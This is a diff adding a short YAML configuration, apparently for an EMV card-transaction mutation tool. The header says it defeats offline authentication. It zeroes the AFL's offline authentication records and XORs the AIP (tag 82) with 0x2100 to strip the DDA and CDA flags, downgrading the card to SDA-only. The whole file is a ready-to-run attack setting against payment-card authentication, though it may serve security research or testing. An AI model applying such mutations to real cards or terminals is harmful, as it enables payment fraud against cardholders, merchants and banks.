@@ -1,0 +1,23 @@
+# COMBO-B — AFL skip-signed + AIP CDA downgrade (defeats offline authentication)
+# Enables: zero all offline_auth_records in AFL, XOR AIP to strip DDA/CDA bits
+enabled: true
+log_mutations: true
+log_path: "logs/mutations.jsonl"
+
+pdol_mutations: []
+
+afl_mutations:
+  - mode:    skip_signed
+    enabled: true
+    comment: "AFL: zero all offline_auth_records — nothing is in the SDA/DDA signing scope"
+
+dol_mutations: []
+
+response_mutations:
+  - tag:     "82"
+    mode:    xor
+    value:   "2100"
+    enabled: true
+    comment: "AIP: XOR 0x2100 clears DDA (bit6) and CDA (bit1) — downgrade to SDA-only"
+
+injected_commands: []
